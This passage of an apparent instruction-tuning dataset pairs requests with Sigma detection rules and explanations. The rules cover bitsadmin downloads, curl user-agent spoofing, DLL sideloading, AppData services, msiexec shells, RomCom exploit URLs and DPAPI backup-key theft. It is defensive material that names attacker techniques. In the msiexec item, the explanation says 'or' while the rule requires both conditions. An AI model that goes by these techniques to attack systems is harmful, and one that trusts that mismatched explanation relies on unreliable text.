    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium\n",
      "question": "usage of bitsadmin downloading a file",
      "answer": "In order to detect usage of bitsadmin downloading a file, you should: focus on monitoring process creation activities within Windows environments. Specifically, look for instances where the process image name ends with '\\bitsadmin.exe' or where the original file name is identified as 'bitsadmin.exe'. To further refine the detection, examine the command line for the presence of '/transfer', which is commonly used in file download commands. Additionally, check if the command line includes both '/create' and '/addfile' as part of its arguments, indicating the creation of a job and addition of a file to it. Another indicator of malicious activity is the inclusion of 'http' in the command line, suggesting the downloading of a file from the internet. It is important to capture both the command line and parent command line fields for analysis. While some legitimate applications may use bitsadmin in a similar manner, these instances are limited. The detection of such activities is considered to be of medium importance."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels\nEnsure that an encryption is used for all sensitive information in transit.\nEnsure that an encrypted channels is used for all administrative account access.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels, ensure that encryption is used for all sensitive information in transit, and ensure that an encrypted channel is used for all administrative account access, you should monitor network flow logs for traffic to specific ports which are commonly associated with unencrypted or potentially insecure communications. These ports include 8080, 21 (FTP), 80 (HTTP), 23 (Telnet), 50000, 1521 (Oracle database), 27017 (MongoDB), 1433 (Microsoft SQL Server), 11211 (Memcached), 3306 (MySQL), 15672 (RabbitMQ), and VNC ports 5900 to 5904. Communications to these ports might indicate that sensitive or administrative data is being transmitted without encryption, which could lead to exposure of confidential information. Be aware that there might be false positive detections, signifying legitimate use of these ports under certain circumstances. Nonetheless, it is critical to treat any activity detected on these ports with scrutiny to maintain the security and integrity of data in transit.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    service: netflow\ndetection:\n    selection:\n        destination.port:\n            - 8080\n            - 21\n            - 80\n            - 23\n            - 50000\n            - 1521\n            - 27017\n            - 1433\n            - 11211\n            - 3306\n            - 15672\n            - 5900\n            - 5901\n            - 5902\n            - 5903\n            - 5904\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    service: netflow\ndetection:\n    selection:\n        destination.port:\n            - 8080\n            - 21\n            - 80\n            - 23\n            - 50000\n            - 1521\n            - 27017\n            - 1433\n            - 11211\n            - 3306\n            - 15672\n            - 5900\n            - 5901\n            - 5902\n            - 5903\n            - 5904\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "Ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels\nEnsure that an encryption is used for all sensitive information in transit.\nEnsure that an encrypted channels is used for all administrative account access.\n",
      "answer": "In order to ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels, ensure that encryption is used for all sensitive information in transit, and ensure that an encrypted channel is used for all administrative account access, you should monitor network flow logs for traffic to specific ports which are commonly associated with unencrypted or potentially insecure communications. These ports include 8080, 21 (FTP), 80 (HTTP), 23 (Telnet), 50000, 1521 (Oracle database), 27017 (MongoDB), 1433 (Microsoft SQL Server), 11211 (Memcached), 3306 (MySQL), 15672 (RabbitMQ), and VNC ports 5900 to 5904. Communications to these ports might indicate that sensitive or administrative data is being transmitted without encryption, which could lead to exposure of confidential information. Be aware that there might be false positive detections, signifying legitimate use of these ports under certain circumstances. Nonetheless, it is critical to treat any activity detected on these ports with scrutiny to maintain the security and integrity of data in transit."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious curl process start on linux with set useragent options.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a suspicious curl process start on linux with set useragent options, you should: Look for instances where a process creation event occurs within a Linux environment, and this event specifically involves the initiation of the 'curl' command. The focus should be on detecting when the 'curl' command line includes options that modify its user-agent string, which are typically denoted by ' -A ' or '--user-agent '. These indicators suggest that the curl command is being used in a way that attempts to disguise its nature or origin, which can be a sign of malicious activity. However, it's important to consider that some legitimate scripts created by developers and system administrators may also use these options for valid purposes. As such, these instances might be flagged as false positives. The significance of detecting these activities is considered of medium level.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith: '/curl'\n        CommandLine|contains:\n            - ' -A '\n            - ' --user-agent '\n    condition: selection\nfalsepositives:\n    - Scripts created by developers and admins\n    - Administrative activity\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith: '/curl'\n        CommandLine|contains:\n            - ' -A '\n            - ' --user-agent '\n    condition: selection\nfalsepositives:\n    - Scripts created by developers and admins\n    - Administrative activity\nlevel: medium\n",
      "question": "suspicious curl process start on linux with set useragent options",
      "answer": "In order to detect a suspicious curl process start on linux with set useragent options, you should: Look for instances where a process creation event occurs within a Linux environment, and this event specifically involves the initiation of the 'curl' command. The focus should be on detecting when the 'curl' command line includes options that modify its user-agent string, which are typically denoted by ' -A ' or '--user-agent '. These indicators suggest that the curl command is being used in a way that attempts to disguise its nature or origin, which can be a sign of malicious activity. However, it's important to consider that some legitimate scripts created by developers and system administrators may also use these options for valid purposes. As such, these instances might be flagged as false positives. The significance of detecting these activities is considered of medium level."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential DLL sideloading of \"SmadHook.dll\", a DLL used by SmadAV antivirus.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential DLL sideloading of \"SmadHook.dll\", a DLL used by SmadAV antivirus, you should: focus on monitoring image load events within Windows environments. Specifically, look for instances where the DLLs named 'SmadHook32c.dll' or 'SmadHook64c.dll' are loaded. These filenames ending with these specific DLLs could indicate an attempt to sideload a malicious DLL using the legitimate SmadAV antivirus software as a cover.\n\nHowever, it's important to distinguish between legitimate and potentially malicious activity. To reduce false positives, exclude any events where these DLLs are loaded by the official SmadAV executable paths, which include 'C:\\Program Files (x86)\\SMADAV\\SmadavProtect32.exe', 'C:\\Program Files (x86)\\SMADAV\\SmadavProtect64.exe', 'C:\\Program Files\\SMADAV\\SmadavProtect32.exe', and 'C:\\Program Files\\SMADAV\\SmadavProtect64.exe'. Also, exclude any instances where the loaded image starts with the legitimate SmadAV directory paths, either under 'C:\\Program Files (x86)\\SMADAV\\' or 'C:\\Program Files\\SMADAV\\'.\n\nThis is considered a high-level alert due to the rarity of false positives and the serious implications of successful DLL sideloading attacks, allowing attackers to execute malicious code under the guise of a trusted application.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded|endswith:\n            - '\\SmadHook32c.dll'\n            - '\\SmadHook64c.dll'\n    filter_main_legit_path:\n        Image:\n            - 'C:\\Program Files (x86)\\SMADAV\\SmadavProtect32.exe'\n            - 'C:\\Program Files (x86)\\SMADAV\\SmadavProtect64.exe'\n            - 'C:\\Program Files\\SMADAV\\SmadavProtect32.exe'\n            - 'C:\\Program Files\\SMADAV\\SmadavProtect64.exe'\n        ImageLoaded|startswith:\n            - 'C:\\Program Files (x86)\\SMADAV\\'\n            - 'C:\\Program Files\\SMADAV\\'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded|endswith:\n            - '\\SmadHook32c.dll'\n            - '\\SmadHook64c.dll'\n    filter_main_legit_path:\n        Image:\n            - 'C:\\Program Files (x86)\\SMADAV\\SmadavProtect32.exe'\n            - 'C:\\Program Files (x86)\\SMADAV\\SmadavProtect64.exe'\n            - 'C:\\Program Files\\SMADAV\\SmadavProtect32.exe'\n            - 'C:\\Program Files\\SMADAV\\SmadavProtect64.exe'\n        ImageLoaded|startswith:\n            - 'C:\\Program Files (x86)\\SMADAV\\'\n            - 'C:\\Program Files\\SMADAV\\'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "potential DLL sideloading of \"SmadHook.dll\", a DLL used by SmadAV antivirus",
      "answer": "In order to detect potential DLL sideloading of \"SmadHook.dll\", a DLL used by SmadAV antivirus, you should: focus on monitoring image load events within Windows environments. Specifically, look for instances where the DLLs named 'SmadHook32c.dll' or 'SmadHook64c.dll' are loaded. These filenames ending with these specific DLLs could indicate an attempt to sideload a malicious DLL using the legitimate SmadAV antivirus software as a cover.\n\nHowever, it's important to distinguish between legitimate and potentially malicious activity. To reduce false positives, exclude any events where these DLLs are loaded by the official SmadAV executable paths, which include 'C:\\Program Files (x86)\\SMADAV\\SmadavProtect32.exe', 'C:\\Program Files (x86)\\SMADAV\\SmadavProtect64.exe', 'C:\\Program Files\\SMADAV\\SmadavProtect32.exe', and 'C:\\Program Files\\SMADAV\\SmadavProtect64.exe'. Also, exclude any instances where the loaded image starts with the legitimate SmadAV directory paths, either under 'C:\\Program Files (x86)\\SMADAV\\' or 'C:\\Program Files\\SMADAV\\'.\n\nThis is considered a high-level alert due to the rarity of false positives and the serious implications of successful DLL sideloading attacks, allowing attackers to execute malicious code under the guise of a trusted application."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting This rule looks for Windows Installer service (msiexec.exe) spawning command line and/or powershell that spawns other processes.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect an attack where the Windows Installer service (msiexec.exe) is used to spawn command line and/or PowerShell processes that then spawn other processes, you should: Monitor Windows systems for the creation of processes where the parent process is identified as either 'cmd.exe' or 'powershell.exe'. Additionally, it's crucial to scrutinize the parent of the parent process for instances where its path includes '\\Windows\\Installer\\' and contains the string 'msi', or when the image name ends with 'tmp'. These specifics are instrumental in identifying suspicious activity associated with the misuse of the Windows Installer to launch potentially malicious scripts or commands through common administrative tools like the command prompt and PowerShell. This detection strategy is built upon enriching Sysmon events with additional details about process relationships, particularly looking into the ParentImage and ParentOfParentImage fields of process creation logs. Any matches should be treated with high suspicion due to the potentially malicious nature of leveraging the Windows Installer process in this manner. It's also important to note that while this method aims to accurately identify malicious activity, instances where it may flag benign processes as suspicious could occur, hence a thorough investigation is recommended for any alerts generated.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\n    definition: Works only if  Enrich Sysmon events with additional information about process in ParentOfParentImage check enrichment section\ndetection:\n    parent_image:\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n    parent_of_parent_image:\n        ParentOfParentImage|contains|all:\n            - '\\Windows\\Installer\\'\n            - 'msi'\n        ParentOfParentImage|endswith:\n            - 'tmp'\n    condition: parent_image and parent_of_parent_image\nfields:\n    - ParentImage\n    - ParentOfParentImage\nfalsepositives:\n    - Unknown\nlevel: high\nenrichment:\n    - EN_0001_cache_sysmon_event_id_1_info                # http://bit.ly/314zc6x\n    - EN_0002_enrich_sysmon_event_id_1_with_parent_info   # http://bit.ly/2KmSC0l\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\n    definition: Works only if  Enrich Sysmon events with additional information about process in ParentOfParentImage check enrichment section\ndetection:\n    parent_image:\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n    parent_of_parent_image:\n        ParentOfParentImage|contains|all:\n            - '\\Windows\\Installer\\'\n            - 'msi'\n        ParentOfParentImage|endswith:\n            - 'tmp'\n    condition: parent_image and parent_of_parent_image\nfields:\n    - ParentImage\n    - ParentOfParentImage\nfalsepositives:\n    - Unknown\nlevel: high\nenrichment:\n    - EN_0001_cache_sysmon_event_id_1_info                # http://bit.ly/314zc6x\n    - EN_0002_enrich_sysmon_event_id_1_with_parent_info   # http://bit.ly/2KmSC0l\n",
      "question": "This rule looks for Windows Installer service (msiexec.exe) spawning command line and/or powershell that spawns other processes",
      "answer": "In order to detect an attack where the Windows Installer service (msiexec.exe) is used to spawn command line and/or PowerShell processes that then spawn other processes, you should: Monitor Windows systems for the creation of processes where the parent process is identified as either 'cmd.exe' or 'powershell.exe'. Additionally, it's crucial to scrutinize the parent of the parent process for instances where its path includes '\\Windows\\Installer\\' and contains the string 'msi', or when the image name ends with 'tmp'. These specifics are instrumental in identifying suspicious activity associated with the misuse of the Windows Installer to launch potentially malicious scripts or commands through common administrative tools like the command prompt and PowerShell. This detection strategy is built upon enriching Sysmon events with additional details about process relationships, particularly looking into the ParentImage and ParentOfParentImage fields of process creation logs. Any matches should be treated with high suspicion due to the potentially malicious nature of leveraging the Windows Installer process in this manner. It's also important to note that while this method aims to accurately identify malicious activity, instances where it may flag benign processes as suspicious could occur, hence a thorough investigation is recommended for any alerts generated."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting files seen being requested by RomCom while potentially exploiting CVE-2023-36884.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect files seen being requested by RomCom while potentially exploiting CVE-2023-36884, you should: Monitor proxy logs for GET requests to specific URLs that contain the following paths: '/ex001.url', '/file001.search-ms', '/file001.url', '/file001.vbs', '/file1.mht', '/o2010.asp', '/redir_obj.html', '/RFile.asp', '/zip_k.asp', '/zip_k2.asp', and '/zip_k3.asp'. These files are indicative of attempt to exploit this vulnerability, and detecting requests for them can alert you to potential malicious activity. The detection level for these activities is set at medium due to the possibility of unknown false positives, outlining the need for further investigation upon alert.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        cs-method: 'GET'\n        c-uri|contains:\n            - '/ex001.url'\n            - '/file001.search-ms'\n            - '/file001.url'\n            - '/file001.vbs'\n            - '/file1.mht'\n            - '/o2010.asp'\n            - '/redir_obj.html'\n            - '/RFile.asp'\n            - '/zip_k.asp'\n            - '/zip_k2.asp'\n            - '/zip_k3.asp'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        cs-method: 'GET'\n        c-uri|contains:\n            - '/ex001.url'\n            - '/file001.search-ms'\n            - '/file001.url'\n            - '/file001.vbs'\n            - '/file1.mht'\n            - '/o2010.asp'\n            - '/redir_obj.html'\n            - '/RFile.asp'\n            - '/zip_k.asp'\n            - '/zip_k2.asp'\n            - '/zip_k3.asp'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "files seen being requested by RomCom while potentially exploiting CVE-2023-36884",
      "answer": "In order to detect files seen being requested by RomCom while potentially exploiting CVE-2023-36884, you should: Monitor proxy logs for GET requests to specific URLs that contain the following paths: '/ex001.url', '/file001.search-ms', '/file001.url', '/file001.vbs', '/file1.mht', '/o2010.asp', '/redir_obj.html', '/RFile.asp', '/zip_k.asp', '/zip_k2.asp', and '/zip_k3.asp'. These files are indicative of attempt to exploit this vulnerability, and detecting requests for them can alert you to potential malicious activity. The detection level for these activities is set at medium due to the possibility of unknown false positives, outlining the need for further investigation upon alert."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect the creation of a service with a service binary located in a uncommon directory.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of a service with a service binary located in an uncommon directory, you should monitor Windows registry settings changes, specifically focusing on the creation or modification of service start options and image paths within the system's service configurations. Start by observing any registry operations where the event type is 'SetValue', indicating a change in value. Specifically, watch for changes within the 'HKLM\\System\\CurrentControlSet\\Services\\' key.\n\nFor the detection of suspicious service creation, look for modifications to the '\\Start' and '\\ImagePath' registry keys. These modifications could indicate attempts to set a service's startup type or specify a service's executable path. Specifically, pay close attention to registry changes where the target object path ends with '\\Start' or '\\ImagePath', and the modifications are made from directories within the user's AppData local or roaming folders, which are uncommon locations for legitimate system services.\n\nThe critical indicators to watch for include:\n- The service's binary being located in '\\AppData\\Local\\' or '\\AppData\\Roaming\\' paths, as legitimate services usually do not reside in these user-specific directories.\n- Changes to the service's start type, particularly settings to boot, system, or automatic start types represented by the specific DWORD values '0x00000000', '0x00000001', and '0x00000002' respectively, which are indicative of a service being configured to start in a manner typical for essential services, thereby raising suspicion when coupled with the uncommon directory location.\n- Ensure to exclude or disregard changes related to benign applications known to legitimately use these directories for their operational services, such as 'Zoom', to avoid unnecessary false positive alerts.\n\nThis monitoring approach utilizes Windows registry logs as its primary log source, focusing on events that indicate a potential unauthorized or malicious service creation. By deploying this strategy, security systems can effectively flag suspicious activities that align with tactics often employed by attackers to gain persistence or execute malicious payloads within a target system, thereby supporting the broader goal of enhancing the detection and prevention of unauthorized system modifications.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection_1:\n        EventType: SetValue\n        TargetObject|startswith: 'HKLM\\System\\CurrentControlSet\\Services\\'\n        TargetObject|endswith: '\\Start'\n        Image|contains:\n            - '\\AppData\\Local\\'\n            - '\\AppData\\Roaming\\'\n        Details:\n            - 'DWORD (0x00000000)'  # boot\n            - 'DWORD (0x00000001)'  # System\n            - 'DWORD (0x00000002)'  # Automatic\n            # 3 - Manual , 4 - Disabled\n    selection_2:\n        EventType: SetValue\n        TargetObject|startswith: 'HKLM\\System\\CurrentControlSet\\Services\\'\n        TargetObject|endswith: '\\ImagePath'\n        Details|contains:\n            - '\\AppData\\Local\\'\n            - '\\AppData\\Roaming\\'\n    filter:\n        - Image|contains:\n            - '\\AppData\\Roaming\\Zoom'\n            - '\\AppData\\Local\\Zoom'\n        - Details|contains:\n            - '\\AppData\\Roaming\\Zoom'\n            - '\\AppData\\Local\\Zoom'\n    condition: 1 of selection_* and not filter\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection_1:\n        EventType: SetValue\n        TargetObject|startswith: 'HKLM\\System\\CurrentControlSet\\Services\\'\n        TargetObject|endswith: '\\Start'\n        Image|contains:\n            - '\\AppData\\Local\\'\n            - '\\AppData\\Roaming\\'\n        Details:\n            - 'DWORD (0x00000000)'  # boot\n            - 'DWORD (0x00000001)'  # System\n            - 'DWORD (0x00000002)'  # Automatic\n            # 3 - Manual , 4 - Disabled\n    selection_2:\n        EventType: SetValue\n        TargetObject|startswith: 'HKLM\\System\\CurrentControlSet\\Services\\'\n        TargetObject|endswith: '\\ImagePath'\n        Details|contains:\n            - '\\AppData\\Local\\'\n            - '\\AppData\\Roaming\\'\n    filter:\n        - Image|contains:\n            - '\\AppData\\Roaming\\Zoom'\n            - '\\AppData\\Local\\Zoom'\n        - Details|contains:\n            - '\\AppData\\Roaming\\Zoom'\n            - '\\AppData\\Local\\Zoom'\n    condition: 1 of selection_* and not filter\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Detect the creation of a service with a service binary located in a uncommon directory",
      "answer": "In order to detect the creation of a service with a service binary located in an uncommon directory, you should monitor Windows registry settings changes, specifically focusing on the creation or modification of service start options and image paths within the system's service configurations. Start by observing any registry operations where the event type is 'SetValue', indicating a change in value. Specifically, watch for changes within the 'HKLM\\System\\CurrentControlSet\\Services\\' key.\n\nFor the detection of suspicious service creation, look for modifications to the '\\Start' and '\\ImagePath' registry keys. These modifications could indicate attempts to set a service's startup type or specify a service's executable path. Specifically, pay close attention to registry changes where the target object path ends with '\\Start' or '\\ImagePath', and the modifications are made from directories within the user's AppData local or roaming folders, which are uncommon locations for legitimate system services.\n\nThe critical indicators to watch for include:\n- The service's binary being located in '\\AppData\\Local\\' or '\\AppData\\Roaming\\' paths, as legitimate services usually do not reside in these user-specific directories.\n- Changes to the service's start type, particularly settings to boot, system, or automatic start types represented by the specific DWORD values '0x00000000', '0x00000001', and '0x00000002' respectively, which are indicative of a service being configured to start in a manner typical for essential services, thereby raising suspicion when coupled with the uncommon directory location.\n- Ensure to exclude or disregard changes related to benign applications known to legitimately use these directories for their operational services, such as 'Zoom', to avoid unnecessary false positive alerts.\n\nThis monitoring approach utilizes Windows registry logs as its primary log source, focusing on events that indicate a potential unauthorized or malicious service creation. By deploying this strategy, security systems can effectively flag suspicious activities that align with tactics often employed by attackers to gain persistence or execute malicious payloads within a target system, thereby supporting the broader goal of enhancing the detection and prevention of unauthorized system modifications."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential DLL sideloading of rcdll.dll.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential DLL sideloading of rcdll.dll, you should: Monitor for instances where the specific Dynamic Link Library (DLL) file named 'rcdll.dll' is loaded into the memory space of a process on Windows systems, particularly paying attention to the event of this DLL being loaded outside of the usual, legitimate paths. Typically, 'rcdll.dll' may be legitimately loaded from paths associated with Microsoft Visual Studio or the Windows Kits directories. Hence, any loading of 'rcdll.dll' from locations that do not start with 'C:\\Program Files (x86)\\Microsoft Visual Studio\\' or 'C:\\Program Files (x86)\\Windows Kits\\' should be flagged for further investigation. This detection mechanism is important because attackers might attempt to exploit legitimate processes by sideloading a malicious version of 'rcdll.dll', a technique that could bypass traditional security measures. The detection focuses on the image load category within the Windows environment, drawing attention to instances that diverge from the expected, safeguarded behavior. It's also noted that while this checking mechanism is in place, cases of unknown false positives are acknowledged, reinforcing the need for periodic review and validation of the detection logic to maintain a high level of security vigilance.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded|endswith: '\\rcdll.dll'\n    filter:\n        ImageLoaded|startswith:\n            - 'C:\\Program Files (x86)\\Microsoft Visual Studio\\'\n            - 'C:\\Program Files (x86)\\Windows Kits\\'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded|endswith: '\\rcdll.dll'\n    filter:\n        ImageLoaded|startswith:\n            - 'C:\\Program Files (x86)\\Microsoft Visual Studio\\'\n            - 'C:\\Program Files (x86)\\Windows Kits\\'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "potential DLL sideloading of rcdll.dll",
      "answer": "In order to detect potential DLL sideloading of rcdll.dll, you should: Monitor for instances where the specific Dynamic Link Library (DLL) file named 'rcdll.dll' is loaded into the memory space of a process on Windows systems, particularly paying attention to the event of this DLL being loaded outside of the usual, legitimate paths. Typically, 'rcdll.dll' may be legitimately loaded from paths associated with Microsoft Visual Studio or the Windows Kits directories. Hence, any loading of 'rcdll.dll' from locations that do not start with 'C:\\Program Files (x86)\\Microsoft Visual Studio\\' or 'C:\\Program Files (x86)\\Windows Kits\\' should be flagged for further investigation. This detection mechanism is important because attackers might attempt to exploit legitimate processes by sideloading a malicious version of 'rcdll.dll', a technique that could bypass traditional security measures. The detection focuses on the image load category within the Windows environment, drawing attention to instances that diverge from the expected, safeguarded behavior. It's also noted that while this checking mechanism is in place, cases of unknown false positives are acknowledged, reinforcing the need for periodic review and validation of the detection logic to maintain a high level of security vigilance."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting tools extracting LSA secret DPAPI domain backup key from Domain Controllers.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect tools extracting LSA secret DPAPI domain backup key from Domain Controllers, you should: Monitor Windows Security logs for events with ID 4662 that involve interactions with objects known as 'SecretObject'. Specifically, pay attention to activities where these objects are accessed with a mask indicating 'write' actions (denoted by AccessMask '0x2'), and the objects in question contain the name 'BCKUPKEY' in their identifiers. Such events are indicative of attempts to access or manipulate critical domain backup keys related to the DPAPI (Data Protection Application Programming Interface), which could be indicative of malicious activities aimed at undermining the security of the LSA (Local Security Authority) secrets. The detection of this activity is considered to be of high importance due to the potential for significant security breaches.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4662\n        ObjectType: 'SecretObject'\n        AccessMask: '0x2'\n        ObjectName|contains: 'BCKUPKEY'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4662\n        ObjectType: 'SecretObject'\n        AccessMask: '0x2'\n        ObjectName|contains: 'BCKUPKEY'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "tools extracting LSA secret DPAPI domain backup key from Domain Controllers",
      "answer": "In order to detect tools extracting LSA secret DPAPI domain backup key from Domain Controllers, you should: Monitor Windows Security logs for events with ID 4662 that involve interactions with objects known as 'SecretObject'. Specifically, pay attention to activities where these objects are accessed with a mask indicating 'write' actions (denoted by AccessMask '0x2'), and the objects in question contain the name 'BCKUPKEY' in their identifiers. Such events are indicative of attempts to access or manipulate critical domain backup keys related to the DPAPI (Data Protection Application Programming Interface), which could be indicative of malicious activities aimed at undermining the security of the LSA (Local Security Authority) secrets. The detection of this activity is considered to be of high importance due to the potential for significant security breaches."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Looks for potential enumeration of AWS buckets via ListBuckets..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to looks for potential enumeration of AWS buckets via ListBuckets, you should: Monitor AWS CloudTrail logs for activities that indicate attempts to list all S3 buckets. Specifically, focus on events where the `eventSource` is `s3.amazonaws.com` and the `eventName` is `ListBuckets`. These events are essential to watch because they can suggest that someone is trying to enumerate, or list, all the AWS S3 buckets, which might be an early step in an attack aiming to discover data or assets to exploit. It's crucial to filter out events generated by `AssumedRole` types to reduce false positives, as these are more likely to be legitimate administrative activities. However, it's recommended to remain cautious and consider context, as administrators legitimately listing buckets can trigger this detection. In such cases, it might be necessary to refine the monitoring process to filter out users who are known to perform this task as part of their normal duties. The sensitivity level for this detection is set to low, acknowledging that while it's a potentially indicative behavior of reconnaissance, it can also be a common administrative task.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: 's3.amazonaws.com'\n        eventName: 'ListBuckets'\n    filter:\n        type: 'AssumedRole'\n    condition: selection and not filter\nfalsepositives:\n    - Administrators listing buckets, it may be necessary to filter out users who commonly conduct this activity.\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: 's3.amazonaws.com'\n        eventName: 'ListBuckets'\n    filter:\n        type: 'AssumedRole'\n    condition: selection and not filter\nfalsepositives:\n    - Administrators listing buckets, it may be necessary to filter out users who commonly conduct this activity.\nlevel: low\n",
      "question": "Looks for potential enumeration of AWS buckets via ListBuckets.",
      "answer": "In order to looks for potential enumeration of AWS buckets via ListBuckets, you should: Monitor AWS CloudTrail logs for activities that indicate attempts to list all S3 buckets. Specifically, focus on events where the `eventSource` is `s3.amazonaws.com` and the `eventName` is `ListBuckets`. These events are essential to watch because they can suggest that someone is trying to enumerate, or list, all the AWS S3 buckets, which might be an early step in an attack aiming to discover data or assets to exploit. It's crucial to filter out events generated by `AssumedRole` types to reduce false positives, as these are more likely to be legitimate administrative activities. However, it's recommended to remain cautious and consider context, as administrators legitimately listing buckets can trigger this detection. In such cases, it might be necessary to refine the monitoring process to filter out users who are known to perform this task as part of their normal duties. The sensitivity level for this detection is set to low, acknowledging that while it's a potentially indicative behavior of reconnaissance, it can also be a common administrative task."
    }
  },
  {
